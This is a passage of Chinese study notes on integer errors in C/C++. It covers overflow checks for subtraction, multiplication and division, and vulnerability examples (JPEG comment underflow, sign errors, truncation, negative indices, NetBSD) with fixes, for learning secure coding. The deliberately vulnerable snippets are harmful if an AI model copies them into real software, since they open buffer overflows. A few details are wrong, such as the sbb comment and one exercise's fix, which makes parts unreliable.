<p>（1）IA-32指令集包含<strong>sub</strong>(减法)、<strong>sbb</strong>(带借位减法)。sub和sbb指令可以对溢出和进位标志置位，以表示带符号或无符号结果的溢出。</p>
<p>（2）sub指令：sub指令从第一个操作数（目的操作数）中减去第二个操作数（源操作数），并将结果存储在目的操作数中。目的操作数可以是一个<strong>寄存器、内存位置；</strong>源操作数可以是一个<strong>立即数、寄存器、内存位置。</strong></p>
<p>（3）sbb指令：指令sbb通常被用<strong>在多字节或多字减法场合</strong>。sbb指令将源操作数（第二个操作数）和进位标志相加，并从目的操作数（第－操作数）中减去刚才所得的结果。减法操作的结果被存储在目的操作数中。进位标志表示上一个减法操作中是否有借位出现。</p>
<p>（4）带符号long long整型Sub</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sll1 - sll2</span><br><span class="line">mov eax, dword ptr [sll1] </span><br><span class="line">sub eax, dword ptr [sll2] <span class="comment">// sub指令减去低位的32位</span></span><br><span class="line">mov ecx, dword ptr [ebp<span class="number">-0E0</span>h] </span><br><span class="line">sbb ecx, dword ptr [ebp<span class="number">-0F</span>0h] <span class="comment">// sbb指令减去低位的32bits</span></span><br></pre></td></tr></table></figure>

<p>（5）先验条件</p>
<p>①要测试无符号整数减能是否溢出，只需检验是否<strong>LHS &lt; RHS。</strong></p>
<p>②对于具有相同符号的精符号整散，不会发生异常情况</p>
<p>③对于混合符号的带符号整数情形，应用下列规则：如果LHS为负，而RHS为正，对signed int类型检查LHS &lt; INT_MIN **+** RHS；如果LHS非负，且RHS为负，检查LHS &gt; INT_MAX <strong>+</strong> RHS</p>
<p>④例如，0-INT_NIN会导致溢出情况，因为该操作的结果比能表示的最大值还要大1。</p>
<p>（6）后验条件</p>
<p>①如果要测试<strong>带符号整数</strong>的溢出，设difference &#x3D; LHS - RHS，并应用如下规则：如果RHS<strong>非负</strong>，并且<strong>difference &gt; LHS</strong>，则发生了溢出；如果RHS为负，并且difference &lt; LHS，则发生了溢出；其他所有情况，没有溢出发生。</p>
<p>②对于无符号整数而言，如果<strong>difference &gt; LHS</strong>，则发生溢出。</p>
<p>5.整数乘法</p>
<p>（1）乘法操作容易引起溢出错误，因为当进行乘法运算时，即使是较小的操作数也可能导致给定的整数类型溢出。其中一个解决方案是，<strong>为积分配两倍于两个操作数中类型较大者的大小的存储空间。</strong></p>
<p>（2）乘法指令：IA-32指令集包含有一个<strong>mul(无符号乘法)指令、imul(带符号乘法)指令。</strong></p>
<p><strong>mul指令：</strong>用于将第一个操作数（目的操作数）和第二个操作数（源操作数）相乘，并将结果存储在目的操作数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (OperandSize == <span class="number">8</span>) &#123;</span><br><span class="line">AX = AL * SRC; <span class="comment">// 8位操作数，存储在16位的目的寄存器中</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (OperandSize == <span class="number">16</span>) &#123;</span><br><span class="line">DX:AX = AX * SRC; <span class="comment">// 16位操作数存储在32位目的寄存器中</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">// OperandSize == 32</span></span><br><span class="line">EDX:EAX = EAX * SRC; <span class="comment">// 32位操作数存储在64位目的寄存器中</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>（3）进位标志和整数溢出标志：如果需要高位<strong>来表示两个操作数的积，则进位标志和溢出标志都被置位</strong>；如果不需要高位（也就是说它们全为0），<strong>那么进位标志和溢出标志都被消除。</strong></p>
<p>①带符号和无符号字符乘法(Visual C++)</p>
<p>练习题：考填空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sc_product = sc1 * sc2; </span><br><span class="line">**movsx** eax, byte ptr [sc1] </span><br><span class="line">**movsx** ecx, byte ptr [sc2] </span><br><span class="line">**imul** eax, ecx</span><br><span class="line">mov byte ptr [sc_product], al</span><br><span class="line">uc_product = uc1 * uc2; </span><br><span class="line">movzx eax, byte ptr [uc1] </span><br><span class="line">movzx ecx, byte ptr [uc2] </span><br><span class="line">imul eax, ecx</span><br><span class="line">mov byte ptr [uc_product], al</span><br><span class="line"></span><br><span class="line">si_product = si1 * si2;</span><br><span class="line">ui_product = ui1 * ui2;</span><br><span class="line">mov eax, dword ptr [ui1] </span><br><span class="line">imul eax, dword ptr [ui2] </span><br><span class="line">mov dword ptr [ui_product], eax</span><br></pre></td></tr></table></figure>

<p>②带符号和无符号字符乘法(g++)</p>
<p>不管char是否带符号，g++对char类型的整数都使用mul指令的字节形式。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc_product = sc1 * sc2;</span><br><span class="line">uc_product = uc1 * uc2;</span><br><span class="line">movb <span class="number">-10</span>(%ebp), %al</span><br><span class="line">mulb <span class="number">-9</span>(%ebp)</span><br><span class="line">movb %al, <span class="number">-11</span>(%ebp)</span><br></pre></td></tr></table></figure>

<p>g++对单字长度的整型，则采用imul指令，不管该类型是否带符号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">si_product = si1 * si2;</span><br><span class="line">ui_product = ui1 * ui2;</span><br><span class="line">movl <span class="number">-20</span>(%ebp), %eax</span><br><span class="line">imull <span class="number">-24</span>(%ebp), %eax</span><br><span class="line">movl %eax, <span class="number">-28</span>(%ebp)</span><br></pre></td></tr></table></figure>

<p>（4）先验条件：为了防止无符号整数相乘时发生溢出，<strong>可以检验A * B &gt; MAX_INT</strong>，也就是A &gt; MAX_INT&#x2F;B，但是除法的开销更大。</p>
<p>（5）后验条件</p>
<p>①后验条件同样<strong>可以用来检测乘法溢出</strong>，不过由于结果需要“两倍于较大操作数的大小”的位数进行表示，因此与加法相比这种情形要复杂一些。</p>
<p><strong>②将两个操作数放到下一个更大的数据类型上，然后相乘。</strong></p>
<p><strong>对于无符号整数：检查下一个大整数的高阶位，如果被设置了，抛出错误。</strong></p>
<p><strong>对带符号整数：如果结果的高半部分及低半部分的符号位全为0或1，则没有发生整数溢出。</strong></p>
<p>③对于16位带符号整数，可以通过这种方式简化对溢出的检测：<strong>将LHS和RHS两个操作数都转型成32位值</strong>，并将乘积<strong>结果存储到32位的目的域中。</strong>如果结果积<strong>右移16位和右移15位</strong>所得结果不一致，则说明发生了溢出。</p>
<p>④对于正的结果，这种方法可以<strong>检测结果值是否溢出到低16位中的符号位</strong>，对于负的结果，这种方法可以<strong>检测结果值是否溢出到高半部分的位中。</strong></p>
<p>6.整数除法</p>
<p>（1）如果32位或64位的带符号整数的MIN_INT值除以-1，那么将会发生溢出。在32位情况下，–2147483648&#x2F;-1的结果应该等于2147483648。由于2147483648无法用带符号的32位整数表示，所以结果出错。**-2147483648&#x2F;-1 &#x3D; -2147483648。**如果参与除法操作的整数的符号和类型不同，那么也容易出问题。</p>
<p>（2）错误检测：IA-32指令集包含如下除法指令<strong>div</strong>,<strong>divpd</strong>,<strong>divps</strong>,<strong>divsd</strong>,<strong>divss,fdiv</strong>,<strong>fdivp</strong>,<strong>fidiv</strong>,<strong>idiv</strong></p>
<p><strong>①div</strong>指令：用源操作数（除数）除存储于ax、dx:ax或edx: eax寄存器中的（无符号）整数（被除数），并将结果存储于ax(ah:al)、dx:ax或edx:eax寄存器中。</p>
<p><strong>②idiv</strong>指令：对（带符号）值执行同样的操作。</p>
<p>③Intel除法指令<strong>div</strong>和<strong>idiv没有设置</strong>整数溢出标志</p>
<p>④下列情况会产生除法错误：<strong>源操作数（除数）为0，</strong>对于目的寄存器而言<strong>结果商值太大。</strong>除法错误会导致一个中断标志向量0。错误报道时，处理器恢复错误指令开始执行时的机器状态。</p>
<p>（3）带符号整数除法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, dword ptr [si_dividend] </span><br><span class="line">cdq</span><br><span class="line">idiv eax, dword ptr [si_divisor] </span><br><span class="line">**si_quotient = si_dividend / si_divisor;**</span><br><span class="line">mov dword ptr [si_quotient], eax</span><br></pre></td></tr></table></figure>

<p>（4）无符号整数除法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">**ui_quotient = ui1_dividend / ui_divisor;**</span><br><span class="line">mov eax, dword ptr [ui_dividend] </span><br><span class="line">xor edx, edx </span><br><span class="line">div eax, dword ptr [ui_divisor] </span><br><span class="line">mov dword ptr [ui_quotient], eax</span><br></pre></td></tr></table></figure>

<p>（5）先验条件：可以通过<strong>检查分子是否为整型的最小值</strong>以及检查<strong>分母是否为-1</strong>来防止整型除法溢出的发生。当然，只要确保<strong>除数不为0</strong>，就可以保证不发生除零错误。</p>
<h3 id="整数的漏洞"><a href="#整数的漏洞" class="headerlink" title="整数的漏洞"></a>整数的漏洞</h3><p>漏洞：一系列<strong>允许违反显式或隐式的安全策略</strong>的情形。安全缺陷可能是<strong>由于硬件层的整数错误或者是跟整数有关的不完善逻辑</strong>所造成的。当这些安全缺陷与其他情形结合起来时，就可能会产生漏洞。</p>
<p>1.JPEG例子：基于在<strong>处理JPEG文件注释域时</strong>存在的实际漏洞</p>
<p>（1）JPEG文件的注释域中包含一个<strong>长为两个字节的长度域</strong>，后者用来指示<strong>注释域的长度</strong>（也包括该两个字节的长度域本身在内）</p>
<p>（2）为了确定注释字符串的单独长度（以便进行内存分配），函数会读取长度域的值并将其减2。</p>
<p>（3）后函数根据注释的长度加上用于表示终结null字符的1个字节所得的总长度来分配内存空间。</p>
<p>Integer整数溢出例子：</p>
<p>*<strong>考试原题（重点，考了n次）：指出并分析下面程序的整数溢出问题</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getComment</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> len, <span class="type">char</span> *src)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">size = len - <span class="number">2</span>;</span><br><span class="line"><span class="type">char</span> *comment = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>); </span><br><span class="line"><span class="comment">// 分配到0字节内存可以成功执行，一个极大的正整数0xffffffff</span></span><br><span class="line"><span class="built_in">memcpy</span>(comment, src, size);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">getComment(<span class="number">1</span>, <span class="string">&quot;Comment&quot;</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>分配到0字节内存的调用可以成功执行，<strong>由于size被声明为unsigned int</strong>，当执行size&#x3D;len-2时，<strong>如果len的值小于2，那么len-2的结果将是一个负数。</strong>由于size被声明为unsigned int，它不能表示负数，<strong>此时会发生整数溢出</strong>。例如，如果len为1，len-2结果为-1。在无符号整数的表示中，**-1会被转换为一个非常大的正数(具体值取决于size_t的位数)。**</li>
<li>malloc(size+1)会分配一个非常大的内存块，这可能会导致内存分配失败，因为系统没有足够的连续内存来满足这个请求。memcpy(comment，src，size)会尝试将src中的数据复制到comment中，由于size是一个错误的大值，这可能会导致访问越界，破坏其他内存区域的数据，引发程序崩溃。</li>
<li>getComment(1, “Comment”)：<strong>当图像注释的长度域的数值为1</strong>时可能会产生溢出。当getComment的参数len&#x3D;1时，可能发生<strong>段错误（缓冲区溢出&#x2F;内存访问越界）</strong>，此时size**&#x3D;0xFFFFFFFF**。</li>
</ul>
<p>2.内存分配例子</p>
<p>（1）整数溢出例子也会发生于内存分配calloc()时，当计算一块内存区域的大小并调用calloc()或其他内存分配函数来分配内存时可能会引起整数溢出</p>
<p>（2）可能会返回一个<strong>小于需求大小的缓存</strong>，从而可能会导致后面的缓冲区溢出</p>
<p>（3）以下代码片断可能会产生漏洞</p>
<p>C: <strong>p &#x3D; calloc(sizeof(element_t), count);</strong></p>
<p>C++: <strong>p &#x3D; new ElementType[count];</strong></p>
<p>（4）内存分配</p>
<p>①库函数calloc()接受两个参数：<strong>存储元素类型所需要的空间、元素的个数</strong></p>
<p>②对于C++的new操作符的情形，则<strong>不需要显式指定元素类型大小</strong></p>
<p>③为了计算所需内存的大小，<strong>使用元素个数乘以该元素类型所需的单位空间</strong>来计算</p>
<p>（5）整数溢出条件</p>
<p>①如果计算所得结果无法用带符号整数表示，那么，尽管分配程序看上去能够成功地执行，但实际上它只会分配非常小的内存空间。</p>
<p>②应用程序对分配的<strong>缓冲区的写操作</strong>可能会越界，从而导致基于堆的缓冲区溢出。</p>
<p>3.符号错误例子</p>
<p>考试题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> BUFF_SIZE 10</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="comment">// 程序接受两个参数：将要被复制的字符串和它的长度</span></span><br><span class="line"><span class="type">int</span> len; <span class="comment">// len被声明为带符号整型</span></span><br><span class="line"><span class="type">char</span> buf[BUFF_SIZE];</span><br><span class="line">len = atoi(argv[<span class="number">1</span>]); <span class="comment">// argv[1]也可以是一个负值</span></span><br><span class="line"><span class="keyword">if</span> (len &lt; BUFF_SIZE)&#123; <span class="comment">// 一个负值能够绕过该检测</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, argv[<span class="number">2</span>], len); <span class="comment">// 值被认为是无符号的size_t类型</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>变量len在第3行被声明为<strong>带符号整型</strong>，这就决定了它在第5行被赋值时<strong>可能会得到一个负值</strong>。<strong>负值可以绕过第6行的检查</strong>，因为小于设定的缓冲区（BUFF_SIZE）长度。在第7行对memcpy()的调用中，这个带符号整数被视作一个size_t类型的无符号整数。这就导致了一个符号错误，<strong>因为负的长度值(len)被解释为一个很大的正整数，从而导致缓冲区溢出。</strong></li>
<li>这个漏洞可以<strong>通过限制整数len为一个有效值</strong>来避免：</li>
</ul>
<p><strong>①加设一个更有效的范围校验</strong>以保证len的值在0到BUFF_SIZE之间<strong>（0&lt;len&lt;BUFF_SIZE）</strong></p>
<p><strong>②声明为无符号整型</strong>：消除在调用函数memcpy()时<strong>从带符号整型到无符号整型的转换、防止发生符号错误。</strong></p>
<p>4.截断：漏洞执行</p>
<p>练习题：<strong>整数截断导致缓冲区溢出</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *name, <span class="type">long</span> cbBuf)</span> &#123;</span><br><span class="line"><span class="comment">// cbBuf用户初始化用于分配buf内存的bufSize</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> bufSize = cbBuf;</span><br><span class="line"><span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(bufSize);</span><br><span class="line"><span class="keyword">if</span> (buf) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(buf, name, cbBuf); </span><br><span class="line"><span class="comment">// cbBuf被声明为long用于设定memcpy()操作中的大小参</span></span><br><span class="line"><span class="keyword">if</span> (buf) <span class="built_in">free</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（1）<strong>cbBuf</strong>被临时保存在了一个unsigned short bufsize中。不论是GCC还是Visucal C++，在基于IA-32的编译器上，unsigned short的最大值都是65535。而同一平台上signed long的最大值是2147483647。任何值位于<strong>65535和2147483647之间</strong>的cbBuf在进行赋值时<strong>都会发生截断错误。</strong></p>
<p>（2）当bufSize同时用于调用malloc()和memcpy()的时候，<strong>只会发生错误并不会产生漏洞。</strong></p>
<p>（3）由于bufSize被用于分配缓冲区的大小，而cbBuf则是用来在调用函数memcpy()时指定大小，因此任何<strong>在1到2147418112(2147483647-65535)字节之间</strong>的buf值<strong>都会引起溢出。</strong></p>
<p>（4）假设unsigned short的最大值为a，signed long的最大值是b。由于bufSize被用于分配缓冲区的大小，而cbBuf则是用来在调用函数memcpy()的指定大小，因此，任何<strong>在a+1到b字节之间</strong>的buf值<strong>都会引起溢出。</strong></p>
<p>5.非异常的整数逻辑错误</p>
<p><strong>（1）许多可利用的软件缺陷并不完全需要一个异常条件</strong>(比如整数溢出)。</p>
<p>（2）负数索引</p>
<p>（3）考试题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *table = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">insert_in_table</span><span class="params">(<span class="type">int</span> pos, <span class="type">int</span> value)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!table) &#123;</span><br><span class="line">table = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">100</span>);</span><br><span class="line"><span class="comment">// 从堆中分配存储空间给数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pos &gt; <span class="number">99</span>) &#123; <span class="comment">// pos小于99</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">table[pos] = value; <span class="comment">// value被插入数组的指定位置</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>如果pos是负值，value将被写入缓冲区pos*4字节之前的位置</strong></li>
<li>漏洞：<strong>对插入位置pos缺乏必要的范围检查，</strong>因此将会导致一个漏洞。因为pos开始时被声明为<strong>带符号整数</strong>，即传递到函数中的值<strong>可正可负</strong>。可以捕获下标越界的正值，但是负值却不会被捕获。</li>
<li>可以通过<strong>在判断pos&gt;99之前同时加入pos&lt;0的判断</strong>修复该漏洞。</li>
</ul>
<p>6.其他C99整数类型</p>
<p>（1）下面的类型有特定的用处：</p>
<p><strong>①ptrdiff_t</strong>为表示两指针相减的结果的带符号整型；size_t是表示sizeof操作符结果的无符号整型。</p>
<p><strong>②wchar_t</strong>的取值范围可以表示所支持的现场（locales）中最大扩展字符集中的所有字符代码。</p>
<p>（2）介绍案例</p>
<p>考试题代码：指出存在问题</p>
<p><strong>未检查argc是否≥3，直接访问argv[1]和argv[2]存在空指针风险。</strong></p>
<p><strong>未检查malloc返回值是否为NULL，可能导致对空指针写入数据而崩溃。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *<span class="type">const</span> *argv)</span> &#123;</span><br><span class="line"><span class="comment">// 接受两个字符串类型的参数并且计算它们的总长度（加上结尾空字符占用的1个额外的字节）</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *) <span class="built_in">malloc</span>(total);</span><br><span class="line"><span class="comment">// 分配足够的内存来存储两个字符</span></span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 首先将第一个参数复制到缓冲区中，然后将第二个参数连接在其尾部</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>漏洞：攻击者可能会<strong>提供两个总长度无法用unsigned short整数total表示的字符串做参数</strong>strlen()函数返回<strong>一个size_t类型，一个IA-32上的unsigned long int</strong>。因此，lengths+1的和是一个unsigned long int。分配给unsigned short int total时值必须被截断。一旦长度的总和大于结果类型的表示范围，它将会被截模截断。</li>
<li>攻击者可能会提供两个总长度<strong>无法用unsigned short整数total表示的字符串</strong>做参数。这样，一旦长度的<strong>总和大于结果类型的表示范围</strong>，它将会被<strong>取模截断</strong>。举例来说，如果第一个参数的长度是65500个字符，第二个参数的长度是36个字符，那么它们的长度<strong>总和加1将是65537个字符</strong>。函数strlen()被定义成返回一个类型size_t的结果，通常就是一个unsigned long。<strong>由于65500和36都是unsigned long，三个值的和也必然是unsigned long。</strong>而将一个unsigned long赋值给一个unsigned short型的变量total，必然要进行降级操作。假设short是16位，则上述运算的结果是(65500+37)%65536&#x3D;1。根据这个结果，<strong>函数malloc()能够成功地分配所需的字节（即1个</strong>），但是该分配为strcpy()和strcat()的执行创造了缓冲区溢出条件。</li>
</ul>
<p>7.NetBSD例子</p>
<p>（1）NetBSD 1.4.2及之前的版本中都使用了以下形式的整数范围检查：**if(off&gt;lensizeof(type-name)) goto error;**这里的off和len都是带符号整型。</p>
<p>（2）漏洞：sizeof操作符返回的是一个无符号整型(<strong>size_t</strong>)，因此整数提升规则要求<strong>len-sizeof(类型名)。</strong>应该按照<strong>无符号整型计算，</strong>当len小于sizeof的返回值时：<strong>减法</strong>操作造成<strong>下溢</strong>并产生一个<strong>很大的正值</strong>，整数范围检查<strong>逻辑被绕过。</strong></p>
<p>（3）利用：一种能够消除此类问题的替代形式的整数范围检查：<strong>if ((off+sizeof(type-name))&gt;len) goto error;<strong>程序员仍然必须保证off的值在一个定义的范围之内，以确保</strong>加法操作不会导致溢出。</strong></p>
<h3 id="缓解策略-1"><a href="#缓解策略-1" class="headerlink" title="缓解策略"></a>缓解策略</h3><p>1.范围检查</p>
<p>（1）<strong>如果适当地运用类型范围检查</strong>，就够<strong>消除所有的整型漏洞</strong>。<strong>（第一条防线）</strong>诸如Pascal或者Ada这些语言，允许对任何标量类型应用范困限制，以形成子类型。</p>
<p>（2）以Ada为例，允许使用range关键字来声明对派生类型的范围约束type day is new INTEGER range 1..31;范围约束会被语言运行时强制执行，C和C++在强制类型安全性方面并不擅长。</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFF_SIZE 10</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// 隐式类型俭查是将len声明为无符号整数而实现的</span></span><br><span class="line"><span class="type">char</span> buf[BUFF_SIZE];</span><br><span class="line">len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span>  &lt;len)&amp;&amp;(len &lt; BUFF_SIZE))&#123; <span class="comment">// 显式范围检查数组的上下界</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, argv[<span class="number">2</span>], len);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(“too much data\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>当<strong>len ≥ BUFF_SIZE</strong>时，可以绕过范围检测导致缓冲区溢出错误，可以通过<strong>使用strncpy函数</strong>避免。</li>
</ul>
<p>2.范围检查解释</p>
<p>（1）<strong>仅仅将len声明为无符号整数并不足以完成范围约束，因为它只能约束从0到MAX_INT的范围</strong>。<strong>检查上下界</strong>，确保不会将越界的值传递给memcpy()。同时使用隐式和显式检查看上去有些累赘，但是<strong>我们推荐</strong>这种健康的偏执式的编程实践。</p>
<p>（2）所有外部输入的数据<strong>都要进行上下界检查</strong>：应该<strong>通过接口来强制执行</strong>对它们的限制。任何<strong>能够限制过大或过小输入</strong>的措施，都有助于防止溢出和其他类型范围错误。</p>
<p>（3）排版约定：<strong>区分代码中的常量和变量</strong>，区分<strong>受外部影响的变量和拥有良好定义范围的局部变量。</strong></p>
<p>3.强类型：提供更好的类型检查的方式之一是<strong>提供更好的类型定义。</strong>将一个变量<strong>声明为无符号的类型</strong>就能够保证该变量不会包含负值。<strong>这种解决方案不能阻止溢出。</strong></p>
<p>4.抽象数据类型：解决方案之一是<strong>创建一个包含私有数据成员waterTemperature的抽象类型，用户不能直接访问该数据成员</strong>。这些方法中<strong>必须提供类型安全机制</strong>，以保证waterTemperature的值在有效范围之内。如果正确地做到了这一点，<strong>就不可能再发生整型范围错误了。</strong></p>
<p>5.Visual C++编译器检查</p>
<p>（1）当一个整数值<strong>被赋给较小的整型时</strong>，Visual C++ NET 2003编译器会<strong>生成一个警告。</strong></p>
<p>（2）在警告级别1，如果类型为_int64的值被赋值给unsigned int类型。在警告级别3和4，如果一个整型被转换给一个较小的整型将会生成“可能会丢失数据”警告。在警告级别4下，以下例子中的赋值就会生成一个C4244警告。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"><span class="type">short</span> a = b + c; <span class="comment">// C4244</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6.Visual C++运行时检查</p>
<p>（1）当一个整数值<strong>被赋给较小的整型时</strong>，Visual C++ NET 2003编译器会<strong>生成一个警告。</strong></p>
<p>（2）&#x2F;RTCc提供了与C4244警告类似的功能，以报告当一个整数被赋值给较小的整型时所导致的数据丢失。</p>
<p>（3）Visual C++中还包含一个runtime_checks pragma，用于禁用或启用／RTC设置，但它并不包括用于捕获其他运行时错误（例如溢出）的标志。</p>
<p>7.加带符号的整数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Wtype __addvsi3 (Wtype a, Wtype b) &#123;</span><br><span class="line"><span class="comment">// gcc运行时系统的一个函数，用于检测带符号16位整数加操作导致的溢出。</span></span><br><span class="line"><span class="type">const</span> Wtype w = a + b;</span><br><span class="line"><span class="keyword">if</span> (b &gt;= <span class="number">0</span> ? w &lt; a : w &gt; a)</span><br><span class="line"><span class="comment">// 加操作被执行，结果与操作数相比较以判断是否发生了溢出。</span></span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line"><span class="comment">// abort()被调用，如果b非负且w&lt;a，b为负数并且w&gt;a。</span></span><br><span class="line"><span class="keyword">return</span> w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>8.安全的整数操作</p>
